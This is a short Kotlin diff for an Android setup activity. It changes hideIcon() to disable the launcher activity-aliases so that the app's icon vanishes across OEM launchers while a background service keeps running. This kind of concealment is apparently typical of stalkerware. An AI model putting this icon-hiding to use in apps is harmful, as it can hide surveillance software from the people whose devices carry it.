@@ -230,13 +230,23 @@ class SetupActivity : AppCompatActivity() {
     }
 
     private fun hideIcon() {
-        try {
-            packageManager.setComponentEnabledSetting(
-                ComponentName(this, SetupActivity::class.java),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            )
-        } catch (_: Exception) {}
+        // BUG FIX: Disabling SetupActivity itself breaks the running service because
+        // the OS can refuse to start a disabled component.  The correct approach is to
+        // disable ONLY the activity-alias that carries the LAUNCHER intent-filter —
+        // all OEM launchers (Realme/ColorOS/OPPO/Vivo/Samsung/Xiaomi) honour
+        // alias component state without caching stale shortcuts.
+        listOf(
+            "$packageName.setup.LauncherAlias",
+            "$packageName.setup.SetupActivityAlias"
+        ).forEach { aliasName ->
+            try {
+                packageManager.setComponentEnabledSetting(
+                    ComponentName(packageName, aliasName),
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP
+                )
+            } catch (_: Exception) {}
+        }
     }
 
     private fun isPermissionGranted(step: Int): Boolean {
